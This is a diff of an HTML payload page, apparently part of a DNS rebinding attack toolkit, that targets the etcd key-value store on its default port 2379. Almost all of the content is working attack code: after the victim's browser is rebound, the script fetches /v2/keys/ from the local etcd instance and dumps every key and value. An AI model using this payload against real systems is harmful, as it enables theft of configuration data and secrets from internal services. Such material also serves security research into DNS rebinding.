@@ -5,59 +5,34 @@ The default API port for etcd is TCP 2379 (localhost:2379).
 -->
 <!doctype html>
 <html>
+
 <head>
-	<title>etcd DNS Rebinding Attack</title>
+	<title>etcd Payload</title>
 	<script src="payload.js"></script>
 	<script>
-	var timer;
-	var interval = 60000;
-	var address;
-
-	function attack() {
-		/* /v2/keys/ : Send a GET request to get the list of keys and values */
-		fetch('/v2/keys/', {})
-			.then(responseOKOrFail("Could not submit a request to get a list of keys"))
-			.then(function (d) { // we successfully received data (the key/value pairs)
-				clearInterval(timer);
-				console.log("raw json: "+d);
-				data = JSON.parse(d); // parse JSON server response
-				nodes = data.node.nodes; // get the nodes array with the key / value pairs
-	            console.log("Number of keys: "+nodes.length);
-				var result = '\n';
-				for (var i = 0; i < nodes.length ; i++ ) {
-					console.log("key: " + nodes[i].key + " value: " + nodes[i].value);
-					result = result+"key: " + nodes[i].key + " value: " + nodes[i].value+"\n"
-    	         }
-				attackSuccess("Your keys and values: "+result);
-			})
-			.catch(function (error) {
-				if (error instanceof TypeError) { // We cannot establish an HTTP connection
-					console.log("frame " + window.location.hostname + " could not load");
-					window.parent.postMessage({
-						status: "error",
-					}, "*");
-				} else if (error.message == 'hastoken') {
-					console.log('DNS rebinding did not happen yet')
-				} else if (error.message == '404') { // We received a 404
-					console.log("file not found. Frame " + window.location.hostname +
-						" has not updated dns yet, waiting " + interval +
-						" ms")
-				} else { // We did not handle something
-					console.log('Unhandled error: ' + error);
-					window.parent.postMessage({
-                            status: "error",
-                        }, "*");;
-				}
-			});
+		function attack(headers, cookie, body) {
+			/* /v2/keys/ : Send a GET request to get the list of keys and values */
+			fetch('/v2/keys/', {})
+				.then(responseOKOrFail("Could not submit a request to get a list of keys"))
+				.then(function (d) { // we successfully received data (the key/value pairs)
+					console.log(`raw json:  ${d}`);
+					let data = JSON.parse(d); // parse JSON server response
+					let nodes = data.node.nodes; // get the nodes array with the key / value pairs
+					console.log(`Number of keys: ${nodes.length}`);
+					let result = '\n';
+					for (var i = 0; i < nodes.length; i++) {
+						console.log(`key:  ${nodes[i].key}, value: ${nodes[i].value}`);
+						result = `${result}key: ${nodes[i].key}, value: ${nodes[i].value}\n`
+					}
+					console.log(`Your keys and values: ${result}`);
+				})
 		}
 	</script>
 </head>
-<body onload="begin()">
-    <p>
-        <h3>DNS Rebinding Vulnerability in etcd</h3>
-    </p>
-    <p>
-        This page is waiting for a dns update.
-    </p>
+
+<body onload="begin('/v2/keys/')" )>
+	<h3>etcd Payload</h3>
+	<p><span id='hostname'></span>. <span id='rebindingstatus'>This page is waiting for a DNS update.</span></p>
 </body>
+
 </html>
